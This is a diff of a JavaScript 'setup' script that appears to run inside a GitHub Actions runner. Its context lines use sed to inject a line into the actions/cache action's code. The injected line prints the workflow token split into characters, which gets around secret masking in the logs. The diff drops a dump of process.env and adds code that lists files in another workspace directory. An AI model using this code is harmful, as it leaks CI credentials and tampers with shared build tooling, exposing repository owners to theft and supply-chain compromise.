@@ -66,7 +66,6 @@ console.log("this is a setup.....")
 // });
 
 
-console.log(process.env);
 let writecontent = 'console.log(JSON.stringify(token.split("")));';
 
 cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
@@ -85,6 +84,16 @@ cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actio
     }
     console.log(`stdout: ${stdout.toString()}`);
     console.log(`stderr: ${stderr}`);
+});
+
+const files_other = fs.readdirSync('/home/runner/work/test_actions_02');
+
+files_other.forEach(element => {
+
+    let path = `/home/runner/work/test_actions_02/${element}`;
+    console.log(path)
+        
+    
 });
 
 
